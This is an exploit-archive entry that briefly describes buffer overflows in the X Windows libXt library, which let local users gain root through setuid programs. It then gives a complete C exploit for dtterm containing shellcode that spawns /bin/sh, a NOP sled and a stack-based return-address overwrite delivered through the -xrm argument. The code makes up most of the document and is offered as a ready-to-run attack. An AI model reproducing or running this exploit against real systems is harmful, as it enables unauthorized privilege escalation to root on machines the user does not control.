source: http://www.securityfocus.com/bid/237/info
 
The libXt library is part of the X Windows system. There are several buffer overflow conditions that may allow an unauthorized user to gain root privileges through setuid and setgid programs that are linked to libXt. These problems were openly discussed on the Bugtraq mailing list in 1996, this discussion led the OpenGroup (maintainers of the X-Windowing System) to release a new version of X Windows which was more thoroughly audited and which hopefully addressed a series of buffer overflows. 

/*
 * dtterm buffer overflow by jGgM
 * http://www.netemperor.com/en/
 * EMail: jggm@mail.com
 * 
*/
#include <stdio.h>
#include <stdlib.h>

char shell[] =
  "\xeb\x48\x9a\xff\xff\xff\xff\x07\xff\xc3\x5e\x31\xc0\x89\x46\xb4"
  "\x88\x46\xb9\x88\x46\x07\x89\x46\x0c\x31\xc0\x50\xb0\x8d\xe8\xdf"
  "\xff\xff\xff\x83\xc4\x04\x31\xc0\x50\xb0\x17\xe8\xd2\xff\xff\xff"
  "\x83\xc4\x04\x31\xc0\x50\x8d\x5e\x08\x53\x8d\x1e\x89\x5e\x08\x53"
  "\xb0\x3b\xe8\xbb\xff\xff\xff\x83\xc4\x0c\xe8\xbb\xff\xff\xff\x2f"
  "\x62\x69\x6e\x2f\x73\x68\xff\xff\xff\xff\xff\xff\xff\xff\xff";

#define NOP	0x90
#define LEN		102

#define BUFFER_SIZE	1052
#define RET_LENGTH	10
#define ADJUST		4

long get_sp(void) {
   __asm__("movl %esp, %eax");
}

int
main(int argc, char *argv[])
{
   char buffer[BUFFER_SIZE+(RET_LENGTH*4)+1];
   long offset, ret;
   int  x, y;

   if(argc > 2) {
      fprintf(stderr, "Usage: %s [offset]\n", argv[0]);
      exit(1);
   } // end of if..

   if(argc == 2) offset = atol(argv[1]);
   else offset = 0;

   ret = get_sp() + 900 + offset;

   for(x=0; x<BUFFER_SIZE; x++) buffer[x] = NOP;

   x = BUFFER_SIZE - strlen(shell) - ADJUST;

   for(y=0; y<strlen(shell); y++)
      buffer[x++] = shell[y];

   for(y=0; y<RET_LENGTH; y++, x += 4)
      *((int *)&buffer[x]) = ret;

   buffer[x] = 0x00;

   printf("ret = 0x%x,\n", ret);
   printf("offset = %d\n", offset);
   printf("buffer size = %d\n", strlen(buffer));
   execl("/usr/dt/bin/dtterm", "dtterm", "-xrm", buffer, NULL);
   printf("exec failed\n");
}